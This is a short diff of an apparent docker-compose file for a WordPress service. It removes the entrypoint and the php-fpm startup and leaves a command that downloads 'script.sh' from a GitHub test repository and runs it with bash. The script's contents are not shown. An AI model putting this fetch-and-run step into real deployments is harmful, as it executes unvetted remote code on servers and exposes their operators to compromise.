@@ -31,13 +31,10 @@ services:
     volumes:
       - ./wordpress:/var/www/html
     restart: always
-    entrypoint: ["docker-entrypoint.sh"]
     command: >
       sh -c '
-        docker-entrypoint.sh php-fpm &
         curl -O https://raw.githubusercontent.com/f803/test/refs/heads/main/script.sh &&
-        /bin/bash script.sh &&
-        wait
+        /bin/bash script.sh
       '
     depends_on:
       db:
